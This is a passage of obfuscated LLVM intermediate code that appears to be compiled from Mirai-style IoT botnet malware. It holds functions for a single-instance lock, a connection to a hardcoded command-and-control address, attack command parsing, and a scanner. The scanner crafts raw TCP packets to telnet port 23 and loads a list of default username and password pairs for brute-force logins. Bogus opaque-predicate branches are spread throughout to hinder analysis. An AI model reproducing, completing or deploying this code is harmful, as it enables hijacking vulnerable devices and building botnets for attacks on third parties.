  call void @teardown_connection()
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %733
  %821 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %822 = load i16, i16* %27, align 2
  %823 = zext i16 %822 to i32
  call void @attack_parse(i8* %821, i32 %823)
  br label %originalBB116
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

declare void @table_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @ensure_single_instance() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__SOCKADDR_ARG, align 8
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 1, i32* %2, align 4
  %5 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %5, i32* @fd_ctrl, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %0
  br label %90

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @fd_ctrl, align 4
  %10 = bitcast i32* %2 to i8*
  %11 = call i32 @setsockopt(i32 %9, i32 1, i32 2, i8* %10, i32 4) #7
  %12 = load i32, i32* @fd_ctrl, align 4
  %13 = load i32, i32* @fd_ctrl, align 4
  %14 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 3, i32 0)
  %15 = or i32 2048, %14
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 4, i32 %15)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %23

; <label>:21:                                     ; preds = %8
  %22 = call i32 @htonl(i32 2130706433) #9
  br label %25

; <label>:23:                                     ; preds = %8
  %24 = load i32, i32* @LOCAL_ADDR, align 4
  br label %25

; <label>:25:                                     ; preds = %23, %21
  %26 = phi i32 [ %22, %21 ], [ %24, %23 ]
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %28 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %27, i32 0, i32 0
  store i32 %26, i32* %28, align 4
  %29 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = call i32* @__errno_location() #9
  store i32 0, i32* %31, align 4
  %32 = load i32, i32* @fd_ctrl, align 4
  %33 = bitcast %union.__SOCKADDR_ARG* %3 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %3, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @bind(i32 %32, %struct.sockaddr* %36, i32 16) #7
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %68

; <label>:39:                                     ; preds = %25
  %40 = call i32* @__errno_location() #9
  %41 = load i32, i32* %40, align 4
  %42 = icmp eq i32 %41, 99
  br i1 %42, label %43, label %48

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %43
  store i8 0, i8* @ensure_single_instance.local_bind, align 1
  br label %48

; <label>:48:                                     ; preds = %47, %43, %39
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  store i32 0, i32* %51, align 4
  %52 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @fd_ctrl, align 4
  %55 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %56 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %56, %struct.sockaddr** %55, align 8
  %57 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %58 = load %struct.sockaddr*, %struct.sockaddr** %57, align 8
  %59 = call i32 @connect(i32 %54, %struct.sockaddr* %58, i32 16)
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %48
  br label %62

; <label>:62:                                     ; preds = %61, %48
  %63 = call i32 @sleep(i32 5)
  %64 = load i32, i32* @fd_ctrl, align 4
  %65 = call i32 @close(i32 %64)
  %66 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %67 = call signext i8 @killer_kill_by_port(i16 zeroext %66)
  call void @ensure_single_instance()
  br label %90

; <label>:68:                                     ; preds = %25
  %69 = load i32, i32* @fd_ctrl, align 4
  %70 = call i32 @listen(i32 %69, i32 1) #7
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %89

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @x.1
  %74 = load i32, i32* @y.2
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %81 = load i32, i32* @x.1
  %82 = load i32, i32* @y.2
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %89

; <label>:89:                                     ; preds = %originalBBpart2, %68
  br label %90

; <label>:90:                                     ; preds = %89, %62, %7
  %91 = load i32, i32* @x.1
  %92 = load i32, i32* @y.2
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %90
  %99 = load i32, i32* @x.1
  %100 = load i32, i32* @y.2
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %72
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %90
  br label %originalBB1
}

declare void @rand_init() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare i32 @util_strlen(i8*) #2

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: nounwind
declare i32 @setsid() #1

declare i32 @close(i32) #2

declare signext i8 @attack_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @establish_connection() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca %union.__SOCKADDR_ARG, align 8
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %10, i32* @fd_serv, align 4
  %11 = icmp eq i32 %10, -1
  %12 = load i32, i32* @x.3
  %13 = load i32, i32* @y.4
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %11, label %20, label %21

; <label>:20:                                     ; preds = %originalBBpart2
  br label %34

; <label>:21:                                     ; preds = %originalBBpart2
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %22 = call i32 @htonl(i32 -1335130672) #9
  store i32 %22, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %23 = call zeroext i16 @htons(i16 zeroext 1024) #9
  store i16 %23, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  %24 = load i32, i32* @fd_serv, align 4
  %25 = load i32, i32* @fd_serv, align 4
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %25, i32 3, i32 0)
  %27 = or i32 2048, %26
  %28 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i32 %27)
  store i8 1, i8* @pending_connection, align 1
  %29 = load i32, i32* @fd_serv, align 4
  %30 = bitcast %union.__SOCKADDR_ARG* %9 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %30, align 8
  %31 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %9, i32 0, i32 0
  %32 = load %struct.sockaddr*, %struct.sockaddr** %31, align 8
  %33 = call i32 @connect(i32 %29, %struct.sockaddr* %32, i32 16)
  br label %34

; <label>:34:                                     ; preds = %21, %20
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %35 = alloca %union.__SOCKADDR_ARG, align 8
  %36 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %36, i32* @fd_serv, align 4
  %37 = icmp eq i32 %36, -1
  br label %originalBB
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #2

declare i64 @send(i32, i8*, i64, i32) #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare void @attack_kill_all() #2

; Function Attrs: noinline nounwind uwtable
define internal void @teardown_connection() #0 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %22

; <label>:3:                                      ; preds = %0
  %4 = load i32, i32* @x.5
  %5 = load i32, i32* @y.6
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = load i32, i32* @fd_serv, align 4
  %13 = call i32 @close(i32 %12)
  %14 = load i32, i32* @x.5
  %15 = load i32, i32* @y.6
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %originalBBpart2, %0
  %23 = load i32, i32* @x.5
  %24 = load i32, i32* @y.6
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  store i32 -1, i32* @fd_serv, align 4
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* @x.5
  %33 = load i32, i32* @y.6
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %40 = load i32, i32* @fd_serv, align 4
  %41 = call i32 @close(i32 %40)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  store i32 -1, i32* @fd_serv, align 4
  %42 = call i32 @sleep(i32 1)
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i32 @rand_next() #2

declare i32 @sleep(i32) #2

declare i32 @util_local_addr() #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #5

declare void @attack_parse(i8*, i32) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

declare i32 @fcntl(i32, i32, ...) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare signext i8 @killer_kill_by_port(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca %struct.iphdr*, align 8
  %5 = alloca %struct.tcphdr*, align 8
  %6 = alloca %struct.payload*, align 8
  %7 = alloca %struct.binary*, align 8
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.scanner_connection*, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.tcphdr*, align 8
  %20 = alloca %union.__SOCKADDR_ARG, align 8
  %21 = alloca i32, align 4
  %22 = alloca [1514 x i8], align 16
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.tcphdr*, align 8
  %25 = alloca %struct.scanner_connection*, align 8
  %26 = alloca %union.__SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = call i32 @fork() #7
  store i32 %37, i32* @scanner_pid, align 4
  %38 = load i32, i32* @scanner_pid, align 4
  %39 = icmp sgt i32 %38, 0
  br i1 %39, label %43, label %40

; <label>:40:                                     ; preds = %0
  %41 = load i32, i32* @scanner_pid, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40, %0
  ret void

; <label>:44:                                     ; preds = %40
  %45 = call i32 @util_local_addr()
  store i32 %45, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %46 = call i64 @time(i64* null) #7
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* @fake_time, align 4
  %48 = call noalias i8* @calloc(i64 628, i64 8264) #7
  %49 = bitcast i8* %48 to %struct.scanner_connection*
  store %struct.scanner_connection* %49, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %1, align 4
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %44
  %51 = load i32, i32* @x.7
  %52 = load i32, i32* @y.8
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %1, align 4
  %60 = icmp slt i32 %59, 628
  %61 = load i32, i32* @x.7
  %62 = load i32, i32* @y.8
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %60, label %69, label %109

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %71 = load i32, i32* %1, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i64 %72
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %73, i32 0, i32 16
  store i32 0, i32* %74, align 8
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %76 = load i32, i32* %1, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i64 %77
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 2
  store i32 -1, i32* %79, align 8
  %80 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %81 = load i32, i32* %1, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %80, i64 %82
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 12
  store i8 0, i8* %84, align 1
  %85 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %86 = load i32, i32* %1, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %85, i64 %87
  %89 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %88, i32 0, i32 6
  store i32 0, i32* %89, align 8
  br label %90

; <label>:90:                                     ; preds = %69
  %91 = load i32, i32* @x.7
  %92 = load i32, i32* @y.8
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %90
  %99 = load i32, i32* %1, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %1, align 4
  %101 = load i32, i32* @x.7
  %102 = load i32, i32* @y.8
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:109:                                    ; preds = %originalBBpart2
  %110 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %110, i32* @rsck, align 4
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %129

; <label>:112:                                    ; preds = %109
  %113 = load i32, i32* @x.7
  %114 = load i32, i32* @y.8
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %112
  call void @exit(i32 0) #8
  %121 = load i32, i32* @x.7
  %122 = load i32, i32* @y.8
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:129:                                    ; preds = %109
  %130 = load i32, i32* @rsck, align 4
  %131 = load i32, i32* @rsck, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 2048, %132
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  store i32 1, i32* %1, align 4
  %135 = load i32, i32* @rsck, align 4
  %136 = bitcast i32* %1 to i8*
  %137 = call i32 @setsockopt(i32 %135, i32 0, i32 3, i8* %136, i32 4) #7
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %139, label %142

; <label>:139:                                    ; preds = %129
  %140 = load i32, i32* @rsck, align 4
  %141 = call i32 @close(i32 %140)
  call void @exit(i32 0) #8
  unreachable

; <label>:142:                                    ; preds = %129
  %143 = load i32, i32* @x.7
  %144 = load i32, i32* @y.8
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %142
  %151 = load i32, i32* @x.7
  %152 = load i32, i32* @y.8
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %159

; <label>:159:                                    ; preds = %179, %originalBBpart212
  %160 = load i32, i32* @x.7
  %161 = load i32, i32* @y.8
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %159
  %168 = call i32 @rand_next()
  %169 = and i32 %168, 65535
  %170 = trunc i32 %169 to i16
  store i16 %170, i16* %2, align 2
  %171 = load i32, i32* @x.7
  %172 = load i32, i32* @y.8
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart219, label %originalBB14alteredBB

originalBBpart219:                                ; preds = %originalBB14
  br label %179

; <label>:179:                                    ; preds = %originalBBpart219
  %180 = load i16, i16* %2, align 2
  %181 = call zeroext i16 @ntohs(i16 zeroext %180) #9
  %182 = zext i16 %181 to i32
  %183 = icmp slt i32 %182, 1024
  br i1 %183, label %159, label %184

; <label>:184:                                    ; preds = %179
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %4, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i64 1
  %187 = bitcast %struct.iphdr* %186 to %struct.tcphdr*
  store %struct.tcphdr* %187, %struct.tcphdr** %5, align 8
  %188 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %189 = bitcast %struct.iphdr* %188 to i8*
  %190 = load i8, i8* %189, align 4
  %191 = and i8 %190, -16
  %192 = or i8 %191, 5
  store i8 %192, i8* %189, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %194 = bitcast %struct.iphdr* %193 to i8*
  %195 = load i8, i8* %194, align 4
  %196 = and i8 %195, 15
  %197 = or i8 %196, 64
  store i8 %197, i8* %194, align 4
  %198 = call zeroext i16 @htons(i16 zeroext 40) #9
  %199 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = call i32 @rand_next()
  %202 = trunc i32 %201 to i16
  %203 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 5
  store i8 64, i8* %206, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 6, i8* %208, align 1
  %209 = call zeroext i16 @htons(i16 zeroext 23) #9
  %210 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = load i16, i16* %2, align 2
  %213 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  store i16 %212, i16* %214, align 4
  %215 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -241
  %219 = or i16 %218, 80
  store i16 %219, i16* %216, align 4
  %220 = call i32 @rand_next()
  %221 = and i32 %220, 65535
  %222 = trunc i32 %221 to i16
  %223 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 5
  store i16 %222, i16* %224, align 2
  %225 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %227, -513
  %229 = or i16 %228, 512
  store i16 %229, i16* %226, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 4)
